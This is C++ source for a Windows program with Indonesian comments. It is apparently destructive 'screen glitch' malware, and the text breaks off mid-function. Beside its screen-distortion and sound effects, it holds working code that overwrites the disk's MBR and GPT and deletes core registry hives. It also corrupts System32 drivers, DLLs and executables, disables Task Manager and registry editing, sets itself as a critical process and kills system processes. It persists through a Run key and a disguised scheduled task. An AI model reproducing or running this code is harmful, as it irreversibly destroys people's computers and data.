#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <thread>
#include <vector>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <cctype>
#include <cstring>
#include <mmsystem.h>
#include <dwmapi.h>
#include <winternl.h>
#include <psapi.h>
#include <shlobj.h>
#include <VersionHelpers.h>
#include <shellapi.h>
#include <winioctl.h>
#include <ntdddisk.h>
#include <aclapi.h>

// Deklarasi untuk deteksi 64-bit
typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
typedef BOOL (WINAPI *LPFN_Wow64DisableWow64FsRedirection)(PVOID*);
typedef BOOL (WINAPI *LPFN_Wow64RevertWow64FsRedirection)(PVOID);

// Pragma handling for MinGW
#ifdef __MINGW32__
#define WINMM_LIB "winmm"
#define USER32_LIB "user32"
#define DWMWAPI_LIB "dwmapi"
#define GDI32_LIB "gdi32"
#define NTDLL_LIB "ntdll"
#else
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#endif

// Konfigurasi intensitas
const int REFRESH_RATE = 5;
const int MAX_GLITCH_INTENSITY = 5000;
const int GLITCH_LINES = 1000;
const int MAX_GLITCH_BLOCKS = 500;
const int SOUND_CHANCE = 2;

// Variabel global
HBITMAP hGlitchBitmap = NULL;
BYTE* pPixels = NULL;
int screenWidth, screenHeight;
BITMAPINFO bmi = {};
int intensityLevel = 1;
DWORD startTime = GetTickCount();
int cursorX = 0, cursorY = 0;
bool cursorVisible = true;
int screenShakeX = 0, screenShakeY = 0;
bool textCorruptionActive = false;
DWORD lastEffectTime = 0;

// Mode destruktif
bool criticalMode = false;
DWORD bsodTriggerTime = 0;
bool persistenceInstalled = false;
bool disableTaskManager = false;
bool disableRegistryTools = false;
bool fileCorruptionActive = false;
bool processKillerActive = false;
bool g_isAdmin = false;  // Admin mode flag

// Struktur untuk efek partikel
struct Particle {
    float x, y;
    float vx, vy;
    DWORD life;
    DWORD maxLife;
    COLORREF color;
    int size;
};

// Struktur untuk efek teks korup
struct CorruptedText {
    int x, y;
    std::wstring text;
    DWORD creationTime;
};

std::vector<Particle> particles;
std::vector<CorruptedText> corruptedTexts;

// ======== FUNGSI ADMIN DESTRUCTIVE ========
BOOL IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

void DestroyMBR() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return;

    // Overwrite first 100 sectors (50KB)
    const DWORD bufferSize = 512 * 100;
    BYTE* garbageBuffer = new BYTE[bufferSize];
    for (DWORD i = 0; i < bufferSize; i++) {
        garbageBuffer[i] = static_cast<BYTE>(rand() % 256);
    }

    DWORD bytesWritten;
    WriteFile(hDrive, garbageBuffer, bufferSize, &bytesWritten, NULL);
    FlushFileBuffers(hDrive);

    delete[] garbageBuffer;
    CloseHandle(hDrive);
}

void DestroyGPT() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return;

    // Overwrite GPT header at LBA 1
    const int gptHeaderSize = 512;
    BYTE* gptGarbage = new BYTE[gptHeaderSize];
    for (int i = 0; i < gptHeaderSize; i++) {
        gptGarbage[i] = static_cast<BYTE>(rand() % 256);
    }

    DWORD bytesWritten;
    LARGE_INTEGER offset;
    offset.QuadPart = 512;  // LBA 1
    SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
    WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);

    // Overwrite partition entries
    const DWORD partitionEntriesSize = 512 * 128;  // 128 sectors
    BYTE* partitionGarbage = new BYTE[partitionEntriesSize];
    for (DWORD i = 0; i < partitionEntriesSize; i++) {
        partitionGarbage[i] = static_cast<BYTE>(rand() % 256);
    }

    offset.QuadPart = 512 * 2;  // LBA 2
    SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
    WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);

    FlushFileBuffers(hDrive);

    delete[] gptGarbage;
    delete[] partitionGarbage;
    CloseHandle(hDrive);
}

// PERBAIKAN 1: Mengganti tipe loop menjadi size_t
void DestroyRegistry() {
    const wchar_t* registryKeys[] = {
        L"HKEY_LOCAL_MACHINE\\SOFTWARE",
        L"HKEY_LOCAL_MACHINE\\SYSTEM",
        L"HKEY_LOCAL_MACHINE\\SAM",
        L"HKEY_LOCAL_MACHINE\\SECURITY",
        L"HKEY_LOCAL_MACHINE\\HARDWARE",
        L"HKEY_CURRENT_USER\\Software",
        L"HKEY_CURRENT_USER\\System",
        L"HKEY_USERS\\.DEFAULT"
    };

    for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
        HKEY hKey;
        wchar_t subKey[256];
        wchar_t rootKey[256];
        
        // Split registry path
        wchar_t* context = NULL;
        wcscpy_s(rootKey, 256, wcstok_s((wchar_t*)registryKeys[i], L"\\", &context));
        wcscpy_s(subKey, 256, context);
        
        HKEY hRoot;
        if (wcscmp(rootKey, L"HKEY_LOCAL_MACHINE") == 0) hRoot = HKEY_LOCAL_MACHINE;
        else if (wcscmp(rootKey, L"HKEY_CURRENT_USER") == 0) hRoot = HKEY_CURRENT_USER;
        else if (wcscmp(rootKey, L"HKEY_USERS") == 0) hRoot = HKEY_USERS;
        else continue;
        
        if (RegOpenKeyExW(hRoot, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
            // Delete all values
            wchar_t valueName[16383];
            DWORD valueNameSize;
            DWORD iValue = 0;
            
            while (1) {
                valueNameSize = 16383;
                if (RegEnumValueW(hKey, iValue, valueName, &valueNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                RegDeleteValueW(hKey, valueName);
            }
            
            // Delete all subkeys
            wchar_t subkeyName[256];
            DWORD subkeyNameSize;
            
            while (1) {
                subkeyNameSize = 256;
                if (RegEnumKeyExW(hKey, 0, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                RegDeleteTreeW(hKey, subkeyName);
            }
            
            RegCloseKey(hKey);
        }
    }
}

void DisableCtrlAltDel() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    if (g_isAdmin) {
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD value = 1;
            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
        }
    }
}

void SetCriticalProcess() {
    typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(
        BOOLEAN bNew,
        BOOLEAN *pbOld,
        BOOLEAN bNeedScb
    );

    HMODULE hNtDll = LoadLibraryW(L"ntdll.dll");
    if (hNtDll) {
        pRtlSetProcessIsCritical RtlSetProcessIsCritical = 
            (pRtlSetProcessIsCritical)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
        FreeLibrary(hNtDll);
    }
}

// PERBAIKAN 2: Deklarasi fungsi sebelum digunakan
void KillCriticalProcesses();

// PERBAIKAN 1: Mengganti tipe loop menjadi size_t
void BreakTaskManager() {
    // Corrupt taskmgr.exe
    const wchar_t* taskmgrPaths[] = {
        L"C:\\Windows\\System32\\taskmgr.exe",
        L"C:\\Windows\\SysWOW64\\taskmgr.exe"
    };

    for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
        HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                BYTE* buffer = new BYTE[fileSize];
                if (buffer) {
                    for (DWORD j = 0; j < fileSize; j++) {
                        buffer[j] = rand() % 256;
                    }
                    DWORD written;
                    WriteFile(hFile, buffer, fileSize, &written, NULL);
                    delete[] buffer;
                }
            }
            CloseHandle(hFile);
        }
    }

    // Kill existing task manager processes
    KillCriticalProcesses(); // PERBAIKAN 2: Panggil fungsi yang sudah dideklarasikan
}

// ======== FUNGSI SUARA & EFEK VISUAL ========
void PlayGlitchSoundAsync() {
    std::thread([]() {
        int soundType = rand() % 25;
        
        switch (soundType) {
        case 0: case 1: case 2: case 3:
            PlaySound(TEXT("SystemHand"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 4: case 5:
            PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 6: case 7:
            Beep(rand() % 4000 + 500, rand() % 100 + 30);
            break;
        case 8: case 9:
            for (int i = 0; i < 50; i++) {
                Beep(rand() % 5000 + 500, 15);
                Sleep(3);
            }
            break;
        case 10: case 11:
            Beep(rand() % 100 + 30, rand() % 400 + 200);
            break;
        case 12: case 13:
            for (int i = 0; i < 30; i++) {
                Beep(rand() % 4000 + 500, rand() % 30 + 10);
                Sleep(2);
            }
            break;
        case 14: case 15:
            for (int i = 0; i < 300; i += 3) {
                Beep(300 + i * 15, 8);
            }
            break;
        case 16: case 17:
            for (int i = 0; i < 10; i++) {
                Beep(50 + i * 100, 200);
            }
            break;
        default:
            for (int i = 0; i < 70; i++) {
                Beep(rand() % 6000 + 500, 20);
                Sleep(1);
            }
            break;
        }
    }).detach();
}

void CaptureScreen(HWND) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    if (!hGlitchBitmap) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screenWidth;
        bmi.bmiHeader.biHeight = -screenHeight;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    }
    
    if (hGlitchBitmap) {
        SelectObject(hdcMem, hGlitchBitmap);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    }
    
    POINT pt;
    GetCursorPos(&pt);
    cursorX = pt.x;
    cursorY = pt.y;
    
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyColorShift(BYTE* pixels, int shift) {
    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
        if (i + shift + 2 < screenWidth * screenHeight * 4) {
            BYTE temp = pixels[i];
            pixels[i] = pixels[i + shift];
            pixels[i + shift] = temp;
        }
    }
}

void ApplyScreenShake() {
    screenShakeX = (rand() % 40 - 20) * intensityLevel;
    screenShakeY = (rand() % 40 - 20) * intensityLevel;
}

void ApplyCursorEffect() {
    if (!cursorVisible || !pPixels) return;
    
    int cursorSize = std::min(50 * intensityLevel, 500);
    int startX = std::max(cursorX - cursorSize, 0);
    int startY = std::max(cursorY - cursorSize, 0);
    int endX = std::min(cursorX + cursorSize, screenWidth - 1);
    int endY = std::min(cursorY + cursorSize, screenHeight - 1);
    
    for (int y = startY; y <= endY; y++) {
        for (int x = startX; x <= endX; x++) {
            float dx = static_cast<float>(x - cursorX);
            float dy = static_cast<float>(y - cursorY);
            float dist = sqrt(dx * dx + dy * dy);
            
            if (dist < cursorSize) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[pos] = 255 - pPixels[pos];
                    pPixels[pos + 1] = 255 - pPixels[pos + 1];
                    pPixels[pos + 2] = 255 - pPixels[pos + 2];
                    
                    if (dist < cursorSize / 2) {
                        float amount = 1.0f - (dist / (cursorSize / 2.0f));
                        int shiftX = static_cast<int>(dx * amount * 10);
                        int shiftY = static_cast<int>(dy * amount * 10);
                        
                        int srcX = x - shiftX;
                        int srcY = y - shiftY;
                        
                        if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                            int srcPos = (srcY * screenWidth + srcX) * 4;
                            if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = pPixels[srcPos];
                                pPixels[pos + 1] = pPixels[srcPos + 1];
                                pPixels[pos + 2] = pPixels[srcPos + 2];
                            }
                        }
                    }
                }
            }
        }
    }
}

void UpdateParticles() {
    if (rand() % 10 == 0) {
        Particle p;
        p.x = rand() % screenWidth;
        p.y = rand() % screenHeight;
        p.vx = (rand() % 200 - 100) / 20.0f;
        p.vy = (rand() % 200 - 100) / 20.0f;
        p.life = 0;
        p.maxLife = 50 + rand() % 200;
        p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
        p.size = 1 + rand() % 3;
        particles.push_back(p);
    }
    
    for (auto it = particles.begin(); it != particles.end(); ) {
        it->x += it->vx;
        it->y += it->vy;
        it->life++;
        
        if (it->life > it->maxLife) {
            it = particles.erase(it);
        } else {
            int x = static_cast<int>(it->x);
            int y = static_cast<int>(it->y);
            if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
                for (int py = -it->size; py <= it->size; py++) {
                    for (int px = -it->size; px <= it->size; px++) {
                        int pxPos = x + px;
                        int pyPos = y + py;
                        if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                            int pos = (pyPos * screenWidth + pxPos) * 4;
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = GetBValue(it->color);
                                pPixels[pos + 1] = GetGValue(it->color);
                                pPixels[pos + 2] = GetRValue(it->color);
                            }
                        }
                    }
                }
            }
            ++it;
        }
    }
}

void ApplyMeltingEffect(BYTE* originalPixels) {
    int meltHeight = 50 + (rand() % 100) * intensityLevel;
    if (meltHeight < 10) meltHeight = 10;
    
    for (int y = screenHeight - meltHeight; y < screenHeight; y++) {
        int meltAmount = (screenHeight - y) * 2;
        for (int x = 0; x < screenWidth; x++) {
            int targetY = y + (rand() % meltAmount) - (meltAmount / 2);
            if (targetY < screenHeight && targetY >= 0) {
                int srcPos = (y * screenWidth + x) * 4;
                int dstPos = (targetY * screenWidth + x) * 4;
                
                if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 &&
                    dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[dstPos] = originalPixels[srcPos];
                    pPixels[dstPos + 1] = originalPixels[srcPos + 1];
                    pPixels[dstPos + 2] = originalPixels[srcPos + 2];
                }
            }
        }
    }
}

void ApplyTextCorruption() {
    if (!textCorruptionActive) return;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    if (rand() % 100 < 30) {
        CorruptedText ct;
        ct.x = rand() % (screenWidth - 300);
        ct.y = rand() % (screenHeight - 100);
        ct.creationTime = GetTickCount();
        
        int textLength = 10 + rand() % 30;
        for (int i = 0; i < textLength; i++) {
            wchar_t c;
            if (rand() % 5 == 0) {
                c = L'�';
            } else {
                c = static_cast<wchar_t>(0x20 + rand() % 95);
            }
            ct.text += c;
        }
        
        corruptedTexts.push_back(ct);
    }
    
    HFONT hFont = CreateFontW(
        24 + rand() % 20, 0, 0, 0, 
        FW_BOLD, 
        rand() % 2, rand() % 2, rand() % 2,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Terminal"
    );
    
    SelectObject(hdcMem, hFont);
    SetBkMode(hdcMem, TRANSPARENT);
    
    for (auto& ct : corruptedTexts) {
        COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
        SetTextColor(hdcMem, color);
        TextOutW(hdcMem, ct.x, ct.y, ct.text.c_str(), static_cast<int>(ct.text.length()));
        
        if (GetTickCount() - ct.creationTime > 5000) {
            ct = corruptedTexts.back();
            corruptedTexts.pop_back();
        }
    }
    
    BITMAPINFOHEADER bmih = {};
    bmih.biSize = sizeof(BITMAPINFOHEADER);
    bmih.biWidth = screenWidth;
    bmih.biHeight = -screenHeight;
    bmih.biPlanes = 1;
    bmih.biBitCount = 32;
    bmih.biCompression = BI_RGB;
    bmih.biSizeImage = 0;
    bmih.biXPelsPerMeter = 0;
    bmih.biYPelsPerMeter = 0;
    bmih.biClrUsed = 0;
    bmih.biClrImportant = 0;
    
    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
    
    DeleteObject(hFont);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyPixelSorting() {
    int startX = rand() % screenWidth;
    int startY = rand() % screenHeight;
    int width = 50 + rand() % 200;
    int height = 50 + rand() % 200;
    
    int endX = std::min(startX + width, screenWidth);
    int endY = std::min(startY + height, screenHeight);
    
    for (int y = startY; y < endY; y++) {
        std::vector<std::pair<float, int>> brightness;
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
                brightness.push_back(std::make_pair(brt, x));
            }
        }
        
        std::sort(brightness.begin(), brightness.end());
        
        std::vector<BYTE> sortedLine;
        for (auto& b : brightness) {
            int pos = (y * screenWidth + b.second) * 4;
            sortedLine.push_back(pPixels[pos]);
            sortedLine.push_back(pPixels[pos+1]);
            sortedLine.push_back(pPixels[pos+2]);
            sortedLine.push_back(pPixels[pos+3]);
        }
        
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                int idx = (x - startX) * 4;
                pPixels[pos] = sortedLine[idx];
                pPixels[pos+1] = sortedLine[idx+1];
                pPixels[pos+2] = sortedLine[idx+2];
                pPixels[pos+3] = sortedLine[idx+3];
            }
        }
    }
}

void ApplyStaticBars() {
    int barCount = 5 + rand() % 10;
    int barHeight = 10 + rand() % 50;
    
    for (int i = 0; i < barCount; i++) {
        int barY = rand() % screenHeight;
        int barHeightActual = std::min(barHeight, screenHeight - barY);
        
        for (int y = barY; y < barY + barHeightActual; y++) {
            for (int x = 0; x < screenWidth; x++) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    if (rand() % 3 == 0) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos+1] = rand() % 256;
                        pPixels[pos+2] = rand() % 256;
                    }
                }
            }
        }
    }
}

void ApplyInversionWaves() {
    int centerX = rand() % screenWidth;
    int centerY = rand() % screenHeight;
    int maxRadius = 100 + rand() % 500;
    float speed = 0.1f + (rand() % 100) / 100.0f;
    DWORD currentTime = GetTickCount();
    
    for (int y = 0; y < screenHeight; y++) {
        for (int x = 0; x < screenWidth; x++) {
            float dx = static_cast<float>(x - centerX);
            float dy = static_cast<float>(y - centerY);
            float dist = sqrt(dx*dx + dy*dy);
            
            if (dist < maxRadius) {
                float wave = sin(dist * 0.1f - currentTime * 0.005f * speed) * 0.5f + 0.5f;
                if (wave > 0.7f) {
                    int pos = (y * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = 255 - pPixels[pos];
                        pPixels[pos+1] = 255 - pPixels[pos+1];
                        pPixels[pos+2] = 255 - pPixels[pos+2];
                    }
                }
            }
        }
    }
}

// ======== FUNGSI PERSISTENSI & DESTRUKSI ========
BOOL IsWindows64() {
    BOOL bIsWow64 = FALSE;
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
    
    if (fnIsWow64Process) {
        fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
    }
    return bIsWow64;
}

void InstallPersistence() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    wchar_t targetPath[MAX_PATH];
    if (g_isAdmin) {
        GetSystemDirectoryW(targetPath, MAX_PATH);
        lstrcatW(targetPath, L"\\winlogon_helper.exe");
    } else {
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, targetPath);
        lstrcatW(targetPath, L"\\system_health.exe");
    }
    
    // Handle Wow64 redirection untuk Windows 64-bit
    PVOID oldRedir = NULL;
    if (IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
            if (pfnDisable) pfnDisable(&oldRedir);
        }
    }
    
    CopyFileW(szPath, targetPath, FALSE);
    
    HKEY hKey;
    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    } else {
        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    }
    RegSetValueExW(hKey, L"SystemHealthMonitor", 0, REG_SZ, (BYTE*)targetPath, (lstrlenW(targetPath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    wchar_t cmd[1024];
    wsprintfW(cmd, 
        L"schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"%s\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
        targetPath, st.wHour, st.wMinute);
    
    // Ganti WinExec dengan CreateProcess
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    // Revert redirection
    if (oldRedir && IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
            if (pfnRevert) pfnRevert(oldRedir);
        }
    }
    
    persistenceInstalled = true;
}

void DisableSystemTools() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    DWORD value = 1;
    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);
    
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);
    
    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    
    disableTaskManager = true;
    disableRegistryTools = true;
}

void CorruptSystemFiles() {
    const wchar_t* targets[] = {
        L"C:\\Windows\\System32\\drivers\\*.sys",
        L"C:\\Windows\\System32\\*.dll",
        L"C:\\Windows\\System32\\*.exe",
        L"C:\\Windows\\System32\\config\\*"
    };
    
    // Handle Wow64 redirection untuk Windows 64-bit
    PVOID oldRedir = NULL;
    if (IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
            if (pfnDisable) pfnDisable(&oldRedir);
        }
    }
    
    for (size_t i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(targets[i], &fd);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    wchar_t filePath[MAX_PATH];
                    if (i == 0) {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
                    } else if (i == 3) {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\config\\%s", fd.cFileName);
                    } else {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\%s", fd.cFileName);
                    }
                    
                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD fileSize = GetFileSize(hFile, NULL);
                        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                            BYTE* buffer = new BYTE[fileSize];
                            if (buffer) {
                                for (DWORD j = 0; j < fileSize; j++) {
                                    buffer[j] = rand() % 256;
                                }
                                
                                DWORD written;
                                WriteFile(hFile, buffer, fileSize, &written, NULL);
                                
                                delete[] buffer;
                            }
                        }
                        CloseHandle(hFile);
                    }
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
    }
    
    // Revert redirection
    if (oldRedir && IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
            if (pfnRevert) pfnRevert(oldRedir);
        }
    }
    
    fileCorruptionActive = true;
}

// PERBAIKAN 2: Fungsi dipindahkan sebelum BreakTaskManager
void KillCriticalProcesses() {
    const wchar_t* targets[] = {
        L"taskmgr.exe",
        L"explorer.exe",
        L"msconfig.exe",
        L"cmd.exe",
        L"powershell.exe",
        L"regedit.exe",
        L"mmc.exe",
        L"services.exe",
        L"svchost.exe",
        L"winlogon.exe"
    };
    
    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        DWORD cProcesses = cbNeeded / sizeof(DWORD);
        
        for (DWORD i = 0; i < cProcesses; i++) {
            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
            
